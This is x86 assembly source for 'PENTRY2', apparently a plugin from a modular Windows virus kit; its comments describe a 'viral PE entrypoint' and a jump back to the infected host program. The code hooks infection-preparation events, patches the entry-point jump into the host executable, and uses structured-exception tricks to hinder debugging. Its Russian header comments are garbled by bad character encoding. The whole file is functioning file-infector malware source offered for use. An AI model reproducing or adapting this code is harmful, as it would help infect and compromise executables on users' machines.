   ; äãªæ¨® «ì ï ª®¯¨ï PENTRY.
   ; § ¬¥ï¥â á®¡®© PENTRY ç¥à¥§ ¥ª®â®à®¥ ;-) ¢à¥¬ï, ¨§-¯®¤ DPGN-áâ ää 

   ; PENTRY2
   ; ~~~~~~
   ; - contains viral PE entrypoint & startup event caller
   ; - contains JMP to original entry point

   include                 system.inc
   include                 unprot.inc
   include                 pentry.inc

   include                 plugin.inc
                           PLUGIN_START    PENTRY2, CODE32, NON_PERMUTABLE

   handleevent:            hookevent EV_PENTRY_START_IN_PE, pentry_disable
                           hookevent EV_PENTRY_PREPARE2INFECT, pentry_prepare
                           stc
                           retn

   pentry_disable:         pusha

                           event   EV_UNPROT_ME

                           mov     edx, EV_PENTRY_BASE
                           event   EV_SYSTEM_GET_PLUGIN_OFFS ; eax=pentry
                           mov     byte ptr [eax+entry_status-plugin_start], entry_disabled

                           popa
                           stc     ; keep event
                           retn

   pentry_prepare:         mov     edx, EV_PENTRY_BASE
                           event   EV_SYSTEM_GET_PLUGIN_OFFS ; eax=pentry

                           ; patch JMP's arg
                           sub     esi, eax
                           sub     esi, pop_addr-plugin_start - (size plugin_struc)
                           mov     [eax+loaderdelta-plugin_start], esi

                           lea     esi, [ecx+pe_entry-plugin_start]
                           lea     edi, [ecx+jmp2host-plugin_start]

                           mov     byte ptr [eax+entry_status-plugin_start], entry_enabled

                           clc
                           retn

   entry_enabled           equ     0E8h    ; call
   entry_disabled          equ     03Dh    ; cmp eax

   pe_entry:
                           call    fuckit

           ; we need the following byte to be changed, 'coz of
           ; multiple DLL_entry calls.
   entry_status            label   byte
                           call    badstuff        ; call/cmp eax, ...

                           call    fuckit

   pop_addr:
                           db      0E9h
   jmp2host                dd      0
                           retn

   fuckit:                 pusha
                           call    __seh_init
                           mov     esp, [esp+8]
                           jmp     __exit
   __seh_init:             push    dword ptr fs:[0]
                           mov     fs:[0], esp
                           xor     edx, edx
                           div     edx
                           jmp     __seh_init
   __exit:                 pop     dword ptr fs:[0]
                           pop     eax
                           popa
                           ret

   badstuff:               pusha

                           call    fuckit

                           mov     ebp, [esp+32]      ; @pop_addr
                           add     ebp, 12345678h
   loaderdelta             equ     dword ptr $-4

                           call    fuckit

                           event   EV_PENTRY_START_IN_PE

                           call    fuckit

                           popa
                           retn

                           PLUGIN_END
